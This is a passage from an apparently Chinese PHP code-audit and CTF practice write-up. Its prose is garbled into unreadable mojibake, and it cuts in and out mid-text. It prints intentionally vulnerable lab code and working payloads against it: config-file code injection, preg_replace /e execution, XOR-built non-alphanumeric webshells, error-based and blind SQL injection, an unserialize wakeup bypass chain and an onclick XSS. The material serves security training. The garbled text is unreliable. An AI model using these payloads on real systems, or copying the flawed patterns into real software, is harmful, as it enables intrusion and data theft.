é‡Œçš„æ­£åˆ™å†™çš„ååˆ†ç½•è§ã€‚å…¶å®ä½¿ç”¨åˆ°çš„æ˜¯phpçš„å­—ç¬¦ç±»ã€‚é™¤äº†ä¸€çœ‹å°±æ‡‚çš„upperè¿™äº›ï¼Œå…¶ä»–çš„å­—ç¬¦ç±»çš„å«ä¹‰æ˜¯ 12graph ç©ºæ ¼ä»¥å¤–çš„å¯æ‰“å°å­—ç¬¦punct æ‰“å°å­—ç¬¦ï¼Œä¸åŒ…æ‹¬å­—æ¯æ•°å­— ä¸»è¦å‡½æ•°é‡Œï¼Œç¬¬ä¸€ä¸ªæ­£åˆ™è¡¨ç¤ºåŒ¹é…åˆ°å¯æ‰“å°å­—ç¬¦12ä¸ªä»¥ä¸Š;ç¬¬äºŒä¸ªæ­£åˆ™è¡¨ç¤ºæŠŠè¿ç»­çš„ç¬¦å·ã€æ•°å­—ã€å¤§å†™ã€å°å†™ï¼Œä½œä¸ºä¸€æ®µï¼Œè‡³å°‘åˆ†å…­æ®µ;ç¬¬ä¸‰ä¸ªæ­£åˆ™è¡¨ç¤ºè¾“å…¥çš„å­—ç¬¦ä¸²è‡³å°‘å«æœ‰ç¬¦å·ã€æ•°å­—ã€å¤§å†™ã€å°å†™ä¸­çš„ä¸‰ç§ç±»å‹ã€‚ æœ€åä¸æ•°å­—è¿›è¡Œå¼±ç±»å‹æ¯”è¾ƒã€‚payload 142.00e+00000 çº¢æ—¥çš„æ–‡ç« é‡Œè¿˜æåˆ°äº†ä¸€ä¸ªé…ç½®ä¸å½“å†™shellçš„é—®é¢˜ã€‚ 123456&lt;?phpif(!isset($_GET['option'])) die();$str = addslashes($_GET['option']);$file = file_get_contents('./config.php');$file = preg_replace('|\\$option=\\'.*\\';|', \"\\$option='$str';\", $file);file_put_contents('./config.php', $file); è¿™ä¸ªæ˜¯ä¸å¸¦ä¿®é¥°ç¬¦æ¨¡å¼çš„æ­£åˆ™åŒ¹é….ç¬¬ä¸€ç§æ–¹æ³• 12http://127.0.0.1/index.php?option=a';%0aphpinfo();//http://127.0.0.1/index.php?option=a ç¬¬ä¸€ä¸ªpayloadå†™å…¥å†…å®¹ååªæœ‰ä¸€ä¸ªå•å¼•å·è¢«è½¬ä¹‰çš„é—®é¢˜ã€‚è€Œç¬¬äºŒéƒ¨åˆ†å†ä¼ å…¥ä¸€ä¸ªaæ—¶å°±ä¼šå› ä¸º.*åŒ¹é…æ— æ•°æ¬¡è€ŒæŠŠ\\æ¢æ‰ è¿˜æœ‰ä¸¤ç§preg_replaceçš„æ–¹æ³•ã€è¿™é‡Œæä¸‹ç¬¬äºŒç§ï¼Œä¹Ÿå°±æ˜¯è¿˜é€‚ç”¨äºå•è¡Œ(éè´ªå©ª)æ¨¡å¼çš„payloadã€‚ä¹‹å‰å®‰æ’çš„å¥—å¨ƒweb2é‡Œå‡ºç°è¿‡ã€‚ 12http:&#x2F;&#x2F;127.0.0.1&#x2F;test&#x2F;ph.php?option&#x3D;;phpinfo();http:&#x2F;&#x2F;127.0.0.1&#x2F;test&#x2F;ph.php?option&#x3D;$0 å…¶æœ€åçš„æ•ˆæœæ˜¯ä¸‹é¢è¿™æ ·çš„ 12&lt;?php$option&#x3D;&#39;$option&#x3D;&#39;;phpinfo();&#39;;&#39;; Day7parse_str()å˜é‡è¦†ç›– parse_strçš„ä½œç”¨å°±æ˜¯è§£æå­—ç¬¦ä¸²å¹¶ä¸”æ³¨å†Œæˆå˜é‡ï¼Œå®ƒåœ¨æ³¨å†Œå˜é‡ä¹‹å‰ä¸ä¼šéªŒè¯å½“å‰å˜é‡æ˜¯å¦å­˜åœ¨ï¼Œæ‰€ä»¥ä¼šç›´æ¥è¦†ç›–æ‰å½“å‰ä½œç”¨åŸŸä¸­åŸæœ‰çš„å˜é‡ã€‚ æ‰€ä»¥æ­¤å¤„å­˜åœ¨çš„å˜é‡é—®é¢˜å°±æ˜¯parse_str()å¤„ç†äº†æˆ‘ä»¬å¯æ§çš„å‚æ•°å,æ˜¯å¯ä»¥èµ·åˆ°æ§åˆ¶å…¨å±€å˜é‡çš„æ•ˆæœçš„ã€‚å› æ­¤å¯ä»¥æ§åˆ¶$configå˜é‡åŠå…¶å¯¹åº”çš„å‚æ•°ã€‚è¾¾æˆå˜é‡è¦†ç›–ã€‚ è§£å†³è¿™ç±»å˜é‡è¦†ç›–é—®é¢˜çš„æœ€å¥½æ–¹æ³•è¿˜æ˜¯é€šè¿‡æ£€æŸ¥æŸä¸€å˜é‡æ˜¯å¦å·²ç»è®¾å®šè¿‡äº†(isset())ã€‚è¿™æ ·åœ¨æ²¡æœ‰è®¾å®šè¿‡å˜é‡çš„elseåˆ†æ”¯æ‰èƒ½å®‰å…¨ä½¿ç”¨parse_str() ç»ƒä¹ 123456789//index.php&lt;?php$a = â€œhongriâ€;$id = $_GET['id'];@parse_str($id);if ($a[0] != 'QNKCDZO' &amp;&amp; md5($a[0]) == md5('QNKCDZO')) &#123; echo '&lt;a href=\"uploadsomething.php\"&gt;flag is here&lt;/a&gt;';&#125;?&gt; 1234567891011121314151617181920212223242526272829303132333435363738//uploadsomething.php&lt;?phpheader(\"Content-type:text/html;charset=utf-8\");$referer = $_SERVER['HTTP_REFERER'];if(isset($referer)!== false) &#123; $savepath = \"uploads/\" . sha1($_SERVER['REMOTE_ADDR']) . \"/\"; if (!is_dir($savepath)) &#123; $oldmask = umask(0); mkdir($savepath, 0777); umask($oldmask); &#125; if ((@$_GET['filename']) &amp;&amp; (@$_GET['content'])) &#123; //$fp = fopen(\"$savepath\".$_GET['filename'], 'w'); $content = 'HRCTF&#123;y0u_n4ed_f4st&#125; by:l1nk3r'; file_put_contents(\"$savepath\" . $_GET['filename'], $content); $msg = 'Flag is here,come on~ ' . $savepath . htmlspecialchars($_GET['filename']) . \"\"; usleep(100000); $content = \"Too slow!\"; file_put_contents(\"$savepath\" . $_GET['filename'], $content); &#125; print &lt;&lt;&lt;EOT&lt;form action=\"\" method=\"get\"&gt;&lt;div class=\"form-group\"&gt;&lt;label for=\"exampleInputEmail1\"&gt;Filename&lt;/label&gt;&lt;input type=\"text\" class=\"form-control\" name=\"filename\" id=\"exampleInputEmail1\" placeholder=\"Filename\"&gt;&lt;/div&gt;&lt;div class=\"form-group\"&gt;&lt;label for=\"exampleInputPassword1\"&gt;Content&lt;/label&gt;&lt;input type=\"text\" class=\"form-control\" name=\"content\" id=\"exampleInputPassword1\" placeholder=\"Contont\"&gt;&lt;/div&gt;&lt;button type=\"submit\" class=\"btn btn-default\"&gt;Submit&lt;/button&gt;&lt;/form&gt;EOT;&#125;else&#123; echo 'you can not see this page';&#125;?&gt; ç¬¬ä¸€éƒ¨åˆ†æ˜¯ä¸€ä¸ªæ¯”è¾ƒåˆ»æ„çš„parse_str()å˜é‡è¦†ç›–çš„ç”¨ä¾‹ã€‚åªè¦è§£å†³md5å¼±ç±»å‹æ¯”è¾ƒçš„é—®é¢˜å°±å¥½äº† 1?id&#x3D;a[0]&#x3D;s878926199a ç¬¬äºŒéƒ¨åˆ†å…ˆæ˜¯æ³¨æ„ä¸€ä¸ªrefererå¤´è¦å¸¦ä¸Šã€‚ä¹‹åå°±æ˜¯ä¸€ä¸ªè¯»flagçš„é—®é¢˜äº†ã€‚å› ä¸ºflagçš„å†…å®¹ä¼šåœ¨æŒ‚èµ·0.1sç„¶åè¢«æ›¿æ¢æ‰ã€‚æ‰€ä»¥éœ€è¦æˆ‘ä»¬å»æ¡ä»¶ç«äº‰ã€‚å½“ç„¶è¿™é‡Œä¸Šä¼ ç›®å½•æ˜¯å›ºå®šçš„ã€‚æ‰€ä»¥å°±å¯ä»¥æ”¾å¿ƒå‘åŒ…äº†ã€‚ Day8preg_replace è¿™æ˜¯ä¸€ä¸ªè‡ªå·±åˆšäº†è§£CTFä¸ä¹…æ—¶æ¥è§¦çš„ä¸€ä¸ªpreg_replace()åœ¨/eä¸‹å­˜åœ¨ä»£ç æ‰§è¡Œçš„æ¼æ´äº†ã€‚å½“ç„¶è¿™ä¸ªæ´æ˜¯php5.5ç‰ˆæœ¬çš„ æˆ‘ä»¬çš„å‚æ•°å¯ä»¥æ§åˆ¶preg_replaceçš„ç¬¬ä¸€ï¼Œä¸‰ä¸ªå‚æ•°ã€‚è¾¾æˆä»»æ„ä»£ç æ‰§è¡Œã€‚ ç„¶åå½“æ—¶ä¹Ÿæ˜¯è¯»åˆ°ä¸€ç¯‡æ–‡ç« ä¸“é—¨è®²åˆ°è¿™é‡Œpayloadçš„æ„é€ åŸæœ¬å®˜æ–¹çš„payload 1&#x2F;?.*&#x3D;&#123;$&#123;phpinfo()&#125;&#125; å¦‚æœGETè¯·æ±‚çš„å‚æ•°åå­˜åœ¨éæ³•å­—ç¬¦ï¼ŒPHPä¼šå°†å…¶æ›¿æ¢æˆä¸‹åˆ’çº¿ï¼Œå³.* ä¼šå˜æˆ _*è€Œå®é™…å¯è¡Œçš„payload 1\\S*&#x3D;$&#123;phpinfo()&#125; ç»ƒä¹ 1234567891011121314151617181920// index.php&lt;?phpinclude 'flag.php';if(isset($_GET['code']))&#123; $code=$_GET['code']; if(strlen($code)&gt;40)&#123; die(\"Long.\"); &#125; if(preg_match(\"/[A-Za-z0-9]+/\",$code))&#123; die(\"NO.\"); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;highlight_file(__FILE);// $hint = \"php function getFlag() to get flag\";?&gt; 12345678910111213141516171819// index2.php&lt;?phpinclude 'flag.php';if(isset($_GET['code']))&#123; $code=$_GET['code']; if(strlen($code)&gt;50)&#123; die(\"Too Long.\"); &#125; if(preg_match(\"/[A-Za-z0-9_]+/\",$code))&#123; die(\"Not Allowed.\"); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;highlight_file(__FILE);// $hint = \"php function getFlag() to get flag\";?&gt; å·²ç»å¸ç©ºè§æƒ¯çš„æ— æ•°å­—å­—æ¯webshellä¹¦å†™äº† ç•™ä¸€ä¸ªFUZZè„šæœ¬ 1234567891011&lt;?php$a = str_split('getFlag');for($i = 0; $i &lt; 256; $i++)&#123; $ch = '&#123;'^ chr($i); if (in_array($ch, $a , true)) &#123; echo \"&#123; ^ chr(\".$i.\") = $ch&lt;br&gt;\"; &#125;&#125;echo \"&#123;&#123;&#123;&#123;&#123;&#123;&#123;\"^chr(28).chr(30).chr(15).chr(61).chr(23).chr(26).chr(28);?&gt; payload1 1$_&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot;;$_(); payload2 1$å“¼&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot;;$å“¼(); ä¸Šæ¬¡åš36dçš„æŸé“é¢˜è‡ªå·±ç”¨äº†æœ€æé™çš„æ— æ•°å­—å­—æ¯ä¸”ä¸èƒ½å¼‚æˆ–å–åçš„webshellã€‚ä¹Ÿå°±æ˜¯é€šé…ç¬¦åŠ ä¸Šphpä¸´æ—¶æ–‡ä»¶å‘½ä»¤æ‰§è¡Œã€‚é‚£ä¸ªåº”è¯¥ç®—æ˜¯æ¯”è¾ƒéš¾ç”¨çš„ï¼Œä½†å¯ä»¥è§£å†³å¤§éƒ¨åˆ†wafäº† Day9str_replace()è¿‡æ»¤ä¸å½“ä¸€ä¸ªæ¯”è¾ƒæ˜æ˜¾çš„è¿‡æ»¤å‡½æ•°é—®é¢˜ã€‚å®ƒåªæ˜¯å°†../æ›¿æ¢ä¸ºç©ºã€‚é‚£ä¹ˆå¾ˆå®¹æ˜“å°±èƒ½ä½¿ç”¨....//è¿›è¡ŒåŒå†™ç»•è¿‡ç„¶åå°±æ˜¯require_once()çš„æ–‡ä»¶åŒ…å«äº†ã€‚ CMSå®ä¾‹å°±æ˜¯é€ æˆè·¯å¾„ç©¿è¶Š,å¾—åˆ°ä»»æ„æ–‡ä»¶è¯»å–ã€‚å½“ç„¶åŒå†™/urläºŒæ¬¡ç¼–ç è¿›è¡Œè·¯å¾„ç©¿è¶Šçš„æŠ€å·§å…¶å®ä¹Ÿç®—å¾ˆå¸¸è§äº†ã€‚ ç»ƒä¹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344/ index.php&lt;?php include 'config.php';include 'function.php';$conn = new mysqli($servername,$username,$password,$dbname);if($conn-&gt;connect_error)&#123; die('è¿æ¥æ•°æ®åº“å¤±è´¥');&#125;$sql = \"SELECT COUNT(*) FROM users\";$result = $conn-&gt;query($sql);if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); $id = $row['COUNT(*)'] + 1;&#125;else die($conn-&gt;error);if(isset($_POST['msg']) &amp;&amp; $_POST['msg'] !=='')&#123; $msg = addslashes($_POST['msg']); $msg = replace_bad_word(convert($msg)); $sql = \"INSERT INTO users VALUES($id,'\".$msg.\"')\"; $result = $conn-&gt;query($sql); if($conn-&gt;error) die($conn-&gt;error);&#125;echo \"&lt;center&gt;&lt;h1&gt;Welcome come to HRSEC message board&lt;/center&gt;&lt;/h1&gt;\";echo &lt;&lt;&lt;EOF&lt;center&gt; &lt;form action=\"index.php\" method=\"post\"&gt; &lt;p&gt;Leave a message: &lt;input type=\"text\" name=\"msg\" /&gt;&lt;input type=\"submit\" value=\"Submit\" /&gt;&lt;/p&gt; &lt;/form&gt;&lt;/center&gt;EOF;$sql = \"SELECT * FROM users\";$result = $conn-&gt;query($sql);if($result-&gt;num_rows &gt; 0)&#123; echo \"&lt;center&gt;&lt;table border='1'&gt;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;message&lt;/th&gt;&lt;tr&gt;&lt;/center&gt;\"; while($row = $result-&gt;fetch_row())&#123; echo \"&lt;tr&gt;&lt;th&gt;$row[0]&lt;/th&gt;&lt;th&gt;$row[1]&lt;/th&gt;&lt;tr&gt;\"; &#125; echo \"&lt;/table&gt;&lt;/center&gt;\";&#125;$conn-&gt;close();?&gt; 12345678910111213141516171819202122// function.php&lt;?php function replace_bad_word($str)&#123; global $limit_words; foreach ($limit_words as $old =&gt; $new) &#123; strlen($old) &gt; 2 &amp;&amp; $str = str_replace($old,trim($new),$str); &#125; return $str;&#125;function convert($str)&#123; return htmlentities($str);&#125;$limit_words = array('é€ å' =&gt; 'é€ **', 'æ³•è½®åŠŸ' =&gt; 'æ³•**');foreach (array('_GET','_POST') as $method) &#123; foreach ($$method as $key =&gt; $value) &#123; $$key = $value; &#125;&#125;?&gt; // config.php 123456789101112131415&lt;?php $servername = \"localhost\";$username = \"hongrisec\";$password = \"hongrisec\";$dbname = \"day9\";?&gt;# æ­å»ºCTFç¯å¢ƒä½¿ç”¨çš„sqlè¯­å¥create database day9;use day9;create table users(id integer auto_increment not null primary key,message varchar(50));create table flag( flag varchar(40));insert into flag values('HRCTF&#123;StR_R3p1ac3_anD_sQ1_inJ3ctIon_zZz&#125;'); å¯æ§çš„msgå˜é‡è¢«æ‹¼æ¥è¿›sqlè¯­å¥ã€‚ä½†æ˜¯å´ç»è¿‡äº†htmlå®ä½“ç¼–ç ,è½¬ä¹‰,è¿‡æ»¤ä¸ªåˆ«è¯çš„æ“ä½œã€‚ ä¸è¿‡,åœ¨function.phpå´å­˜åœ¨å¾ˆæ˜æ˜¾çš„å˜é‡è¦†ç›–æ¼æ´ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡è¦†ç›–$limit_wordsæ•°ç»„ï¼Œæ¥é€ƒé€¸å•å¼•å·. æœ€åpayload 121%00&#39; and updatexml(1,concat(0x7e,(select flag from flag),0x7e),1))#&amp;limit_words[\\0\\]&#x3D;1%00&#39; and updatexml(1,concat(0x7e,(select reverse(flag) from flag),0x7e),1))#&amp;limit_words[\\0\\]&#x3D; Day10ç¨‹åºåˆ¤é”™æœªexit() è¿™é‡Œçš„é—®é¢˜ä¸»è¦æ˜¯:ä»£ç è™½ç„¶æœ‰ç›¸åº”çš„é˜²å¾¡æ“ä½œï¼Œä½†æ˜¯ç¨‹åºæœªç«‹å³åœæ­¢é€€å‡ºï¼Œå¯¼è‡´ç¨‹åºç»§ç»­æ‰§è¡Œçš„é—®é¢˜ æ­¤å¤„extract()å¾—åˆ°äº†ä¸€ä¸ªå˜é‡è¦†ç›–çš„åˆ©ç”¨åŠ ä¸Šassert()ï¼Œæ‰€ä»¥piå˜é‡ç›´æ¥ç»™webshellä»£ç å³å¯ æˆ‘ä¸ªäººä¸€æ¬¡ä½“éªŒæ¯”è¾ƒæ·±çš„ç»å†æ˜¯:åœ¨htbçš„æŸä¸ªé¶æœºä¸­ã€‚æœ‰ä¸€å¤„phpä»£ç ä¸­æ›¾ç»é™å®šåªæœ‰æŒ‡å®šç”¨æˆ·è®¿é—®(æ£€æŸ¥session),æ‰ä¼šæ˜¾ç¤ºå…¶sshå¯†é’¥ã€‚è€Œæ­¤æ—¶æˆ‘ä»¬çš„æƒé™æ˜¯www-data.çœ‹ä¼¼æ— æ³•è·å¾—sshå¯†é’¥,ä½†æ˜¯å…¶ä»£ç ä¸­å‡ºç°äº†ç–å¿½,åœ¨å¯¹userçš„sessionåˆ¤åˆ«åæ²¡æœ‰ç«‹å³exit().é‚£ä¹ˆå½“æˆ‘ä»¬ä»¥www-dataç›´æ¥æœ¬åœ°curlè¿™ä¸€ç½‘é¡µæ—¶,å°†å¯ä»¥å¾—åˆ°å¯†é’¥,è¿›è€Œææƒã€‚ ç»ƒä¹ 123456789101112131415161718192021222324252627282930313233343536373839404142// index.php&lt;?phpinclude 'config.php';function stophack($string)&#123; if(is_array($string))&#123; foreach($string as $key =&gt; $val) &#123; $string[$key] = stophack($val); &#125; &#125; else&#123; $raw = $string; $replace = array(\"\\\\\",\"\\\"\",\"'\",\"/\",\"*\",\"%5C\",\"%22\",\"%27\",\"%2A\",\"~\",\"insert\",\"update\",\"delete\",\"into\",\"load_file\",\"outfile\",\"sleep\",); $string = str_ireplace($replace, \"HongRi\", $string); $string = strip_tags($string); if($raw!=$string)&#123; error_log(\"Hacking attempt.\"); header('Location: /error/'); &#125; return trim($string); &#125;&#125;$conn = new mysqli($servername, $username, $password, $dbname);if ($conn-&gt;connect_error) &#123; die(\"è¿æ¥å¤±è´¥: \");&#125;if(isset($_GET['id']) &amp;&amp; $_GET['id'])&#123; $id = stophack($_GET['id']); $sql = \"SELECT * FROM students WHERE id=$id\"; $result = $conn-&gt;query($sql); if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); echo '&lt;center&gt;&lt;h1&gt;æŸ¥è¯¢ç»“æœä¸ºï¼š&lt;/h1&gt;&lt;pre&gt;'.&lt;&lt;&lt;EOF +----+---------+--------------------+-------+ | id | name | email | score | +----+---------+--------------------+-------+ | &#123;$row['id']&#125; | &#123;$row['name']&#125; | &#123;$row['email']&#125; | &#123;$row['score']&#125; | +----+---------+--------------------+-------+&lt;/center&gt;EOF; &#125;&#125;else die(\"ä½ æ‰€æŸ¥è¯¢çš„å¯¹è±¡idå€¼ä¸èƒ½ä¸ºç©ºï¼\");?&gt; æ˜¾ç„¶,ç¨‹åºå¦‚æœæ£€æµ‹åˆ°éæ³•å­—ç¬¦æˆ–å•è¯ï¼Œéƒ½ä¼šå°†å…¶æ›¿æ¢æˆå­—ç¬¦ä¸² HongRi ï¼Œç„¶è€Œå¹¶æ²¡æœ‰ç«‹å³é€€å‡ºï¼Œè¿™æ ·æ”»å‡»è€…è¾“å…¥çš„æ”»å‡»è¯­å¥è¿˜æ˜¯ä¼šç»§ç»­è¢«å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ã€‚åªä¸è¿‡è¿™é‡Œå…³é”®è¯éƒ½è¢«æ›¿æ¢æˆäº†å­—ç¬¦ä¸² HongRi ç®€å•çš„ä½¿ç”¨benchmarkæ›¿æ¢sleepå³å¯ç›²æ³¨ 1-1 or if(ascii(mid((select flag from flag),1,1))&#x3D;115,benchmark(200000000,7^3^8),0) Day11phpååºåˆ—åŒ–(ç¬¬11è¡Œæ­£åˆ™è¡¨è¾¾å¼åº”æ”¹ä¸ºï¼šâ€™/O:\\d:/â€˜) é¦–å…ˆç¡®è®¤äº†å­˜åœ¨ååºåˆ—åŒ–ã€‚ä¸”æ•°æ®æ˜¯cookieå¯æ§ã€‚é‚£ä¹ˆè€ƒè™‘ä¸‹ç»•è¿‡æ‰§è¡Œååºåˆ—åŒ–ã€‚ é‚£ä¹ˆçœ‹ä¸‹loaddataé‡Œçš„é™åˆ¶å¼€å¤´ä¸èƒ½æ˜¯O:,å³ååºåˆ—åŒ–å†…å®¹ä¸ä¸ºå¯¹è±¡åŒæ—¶éœ€è¦ä¸èƒ½åŒ¹é…å­—ç¬¦ä¸²ä¸ºO:ä»»æ„åè¿›åˆ¶:å¦‚æœåªæ˜¯ç¬¬ä¸€éƒ¨åˆ†å½“ç„¶å¯ä»¥ä½¿ç”¨æ•°ç»„ç»•è¿‡ã€‚ä½†æ˜¯è¿™æ ·ç¬¬äºŒéƒ¨åˆ†è¿˜æ˜¯ä¼šåŒ¹é…åˆ°æ•°ç»„ä¸­çš„å¯¹è±¡æˆåˆ†ã€‚ è¿™é‡Œç”¨åˆ°çš„æ˜¯ä¸€ä¸ªæ¯”è¾ƒè€çš„ç»•è¿‡æ–¹æ³•äº†ã€‚å³ä½¿ç”¨O:+ç»•è¿‡ã€‚è€ŒåŸç†å¯ä»¥æ¶‰åŠåˆ°åº•å±‚æºç ã€‚å‡½æ•°é‡åˆ°+å·æ—¶ä¼šç»§ç»­å‘ä¸‹åˆ¤æ–­ï¼Œå› æ­¤å¯ä»¥æ­£å¸¸ååºåˆ—åŒ–ã€‚ æœ€åå°±èƒ½æˆåŠŸæ‰§è¡Œå†™æ–‡ä»¶webshelläº†ã€‚ ç»ƒä¹  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112 &lt;?phpinclude \"config.php\";class HITCON&#123; public $method; public $args; public $conn; function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; $this-&gt;__conn(); &#125; function __conn() &#123; global $db_host, $db_name, $db_user, $db_pass, $DEBUG; if (!$this-&gt;conn) $this-&gt;conn = mysql_connect($db_host, $db_user, $db_pass); mysql_select_db($db_name, $this-&gt;conn); if ($DEBUG) &#123; $sql = \"DROP TABLE IF EXISTS users\"; $this-&gt;__query($sql, $back=false); $sql = \"CREATE TABLE IF NOT EXISTS users (username VARCHAR(64), password VARCHAR(64),role VARCHAR(256)) CHARACTER SET utf8\"; $this-&gt;__query($sql, $back=false); $sql = \"INSERT INTO users VALUES ('orange', '$db_pass', 'admin'), ('phddaa', 'ddaa', 'user')\"; $this-&gt;__query($sql, $back=false); &#125; mysql_query(\"SET names utf8\"); mysql_query(\"SET sql_mode = 'strict_all_tables'\"); &#125; function __query($sql, $back=true) &#123; $result = @mysql_query($sql); if ($back) &#123; return @mysql_fetch_object($result); &#125; &#125; function login() &#123; list($username, $password) = func_get_args(); $sql = sprintf(\"SELECT * FROM users WHERE username='%s' AND password='%s'\", $username, md5($password)); $obj = $this-&gt;__query($sql); if ( $obj != false ) &#123; define('IN_FLAG', TRUE); $this-&gt;loadData($obj-&gt;role); &#125; else &#123; $this-&gt;__die(\"sorry!\"); &#125; &#125; function loadData($data) &#123; if (substr($data, 0, 2) !== 'O:' &amp;&amp; !preg_match('/O:\\d:/', $data)) &#123; return unserialize($data); &#125; return []; &#125; function __die($msg) &#123; $this-&gt;__close(); header(\"Content-Type: application/json\"); die( json_encode( array(\"msg\"=&gt; $msg) ) ); &#125; function __close() &#123; mysql_close($this-&gt;conn); &#125; function source() &#123; highlight_file(__FILE__); &#125; function __destruct() &#123; $this-&gt;__conn(); if (in_array($this-&gt;method, array(\"login\", \"source\"))) &#123; @call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; else &#123; $this-&gt;__die(\"What do you do?\"); &#125; $this-&gt;__close(); &#125; function __wakeup() &#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = strtolower(trim(mysql_escape_string($v))); &#125; &#125;&#125;class SoFun&#123; public $file='index.php'; function __destruct()&#123; if(!empty($this-&gt;file)) &#123; include $this-&gt;file; &#125; &#125; function __wakeup()&#123; $this-&gt; file='index.php'; &#125;&#125;if(isset($_GET[\"data\"])) &#123; @unserialize($_GET[\"data\"]);&#125;else &#123; new HITCON(\"source\", array());&#125;?&gt; 12345678//config.php&lt;?php $db_host = 'localhost'; $db_name = 'test'; $db_user = 'root'; $db_pass = '123'; $DEBUG = 'xx';?&gt; 123456// flag.php&lt;?php!defined('IN_FLAG') &amp;&amp; exit('Access Denied');echo \"flag&#123;un3eri@liz3_i3_s0_fun&#125;\";?&gt; å…ˆä»ç®€å•çš„çœ‹èµ·,é¦–å…ˆæ˜¯SoFunç±»ã€‚æ˜¾ç„¶ç»•è¿‡wakeupå³å¯includeå¯æ§æ•°æ®flag.phpã€‚ä½†æ˜¯éœ€è¦æ³¨æ„flag.phpé™åˆ¶äº†å¿…é¡»defined(&#39;IN_FLAG&#39;)ã€‚ æ³¨æ„åˆ°HITCONç±»åˆ™æœ‰ä¸€ä¸ªè·Ÿå‰é¢ä¾‹å­ä¸€æ ·çš„loaddataã€‚é‚£å°±å¯ä»¥ç”¨ç›¸åŒæ–¹æ³•ç»•è¿‡æ‰§è¡Œååºåˆ—åŒ–ã€‚ HITCONç±»loginæ–¹æ³•æ˜¾ç„¶å­˜åœ¨sqlæ³¨å…¥,ä¸”loaddataå°±æ˜¯åœ¨è¿™é‡Œè¢«è°ƒç”¨çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬éœ€è¦è®©loaddataä¼ å…¥çš„æ•°æ®ä¸ºSoFunç±»çš„æ–‡ä»¶åŒ…å«åºåˆ—åŒ–æ•°æ®ã€‚è€Œè¿™ä¸€æ•°æ®æ¥è‡ª$obj-&gt;role. $objæ˜¯sqlè¯­å¥çš„è¿”å›ç»“æœã€‚è€Œsqlè¡¨ç»“æ„ä¸­ç¬¬ä¸‰ä¸ªå­—æ®µroleæ­£æ˜¯æˆ‘ä»¬éœ€è¦çš„ã€‚é‚£ä¹ˆåªè¦åˆ©ç”¨è¿™ä¸ªsqlæ³¨å…¥è¿›è¡ŒunionæŸ¥è¯¢å°±è¾¾æˆ$obj-&gt;roleå¯æ§ã€‚ ç”±äºææ„å‡½æ•°ä¸­å¯ä»¥æ§åˆ¶æˆ‘ä»¬è°ƒç”¨çš„æ–¹æ³•åŠå‚æ•°ã€‚æ‰€ä»¥ä»¥ä¸Šæ€è·¯å¯ä»¥æ‰§è¡Œã€‚ æœ€åæ³¨æ„çš„æ˜¯ã€‚HITCONç±»çš„wakeupä¼šå¯¹sqlè¯­å¥è¿›è¡Œè½¬ä¹‰ã€‚æ‰€ä»¥æˆ‘ä»¬ç”¨åŒæ ·çš„æ–¹æ³•ç»•è¿‡wakeupå³å¯ O:6:&quot;HITCON&quot;:3:{s:6:&quot;method&quot;;s:5:&quot;login&quot;;s:4:&quot;args&quot;;a:2:{s:8:&quot;username&quot;;s:81:&quot;1&#39; union select 1,2,&#39;a:1:{s:2:&quot;xx&quot;;O:%2b5:&quot;SoFun&quot;:2:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}}&#39;%23&quot;;s:8:&quot;password&quot;;s:3:&quot;234&quot;;}} Day12htmlentities()å¤„ç†ä¸å…¨è¿™é‡Œçš„ä»£ç å­˜åœ¨ä¸€ä¸ªxssæ”»å‡».è¾“å‡ºç‚¹åœ¨ä¸€ä¸ªaæ ‡ç­¾ã€‚åŒæ—¶è¾“å‡ºæ—¶ç»è¿‡äº†ä¸€æ¬¡htmlentities.ä¸è¿‡è¿™ä¸ªå‡½æ•°htmlentities()å¹¶ä¸èƒ½è½¬æ¢æ‰€æœ‰çš„ç‰¹æ®Šå­—ç¬¦ï¼Œæ˜¯è½¬æ¢é™¤äº†ç©ºæ ¼ä¹‹å¤–çš„ç‰¹æ®Šå­—ç¬¦ï¼Œä¸”å•å¼•å·å’ŒåŒå¼•å·éœ€è¦å•ç‹¬æ§åˆ¶æ­¤å¤„é»˜è®¤å€¼çš„è¯æ˜¯ä¸ä¼šè½¬ä¹‰å•å¼•å·çš„ã€‚åŒæ—¶å‰é¢åœ¨å˜é‡è¦†ç›–æ—¶ä¼ å…¥çš„å˜é‡åªå¯¹$value è¿›è¡Œç±»å‹è½¬æ¢ï¼Œå¼ºåˆ¶å˜æˆintç±»å‹ã€‚ä½†æ˜¯è¿™éƒ¨åˆ†ä»£ç åªå¤„ç†äº† $value å˜é‡ï¼Œæ²¡é’ˆå¯¹ $key å˜é‡è¿›è¡Œå¤„ç† æ‰€ä»¥payloadæ˜¯/?a&#39;onclick%3dalert(1)%2f%2f=cç»•è¿‡intvalçš„åŒæ—¶æ‰§è¡Œäº†aæ ‡ç­¾çš„onclikäº‹ä»¶,è¾¾æˆxss. ç»ƒä¹ 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phprequire 'db.inc.php';if(isset($_REQUEST['username']))&#123; if(preg_match(\"/(?:\\w*)\\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i\", $_REQUEST['username']))&#123; die(\"Attack detected!!!\"); &#125;&#125;if(isset($_REQUEST['password']))&#123; if(preg_match(\"/(?:\\w*)\\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i\", $_REQUEST['password']))&#123; die(\"Attack detected!!!\"); &#125;&#125;function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = 